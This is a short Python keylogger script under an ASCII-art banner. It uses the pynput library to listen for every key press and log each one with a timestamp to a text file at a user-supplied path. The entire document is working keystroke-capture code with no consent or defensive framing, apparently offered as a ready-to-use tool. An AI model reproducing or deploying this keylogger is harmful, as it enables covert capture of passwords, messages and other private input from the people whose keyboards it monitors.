'''
─────────────────────────────────────────────────────────────────
─██████████████───██████████████─██████──████████─██████████████─
─██░░░░░░░░░░██───██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██─
─██░░██████░░██───██░░██████░░██─██░░██──██░░████─██░░██████░░██─
─██░░██──██░░██───██░░██──██░░██─██░░██──██░░██───██░░██──██░░██─
─██░░██████░░████─██░░██████░░██─██░░██████░░██───██░░██──██░░██─
─██░░░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██───██░░██──██░░██─
─██░░████████░░██─██░░██████░░██─██░░██████░░██───██░░██──██░░██─
─██░░██────██░░██─██░░██──██░░██─██░░██──██░░██───██░░██──██░░██─
─██░░████████░░██─██░░██──██░░██─██░░██──██░░████─██░░██████░░██─
─██░░░░░░░░░░░░██─██░░██──██░░██─██░░██──██░░░░██─██░░░░░░░░░░██─
─████████████████─██████──██████─██████──████████─██████████████─
─────────────────────────────────────────────────────────────────
'''

import pynput
import logging
from pynput.keyboard import Key, Listener

ldir = r"PATH_TO_YOUR_KEYLOG_TXT_FILE"
logging.basicConfig(filename=(ldir + r"\keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def each_press(key):
    logging.info(str(key))

with Listener(on_press=each_press) as listener:
    listener.join()
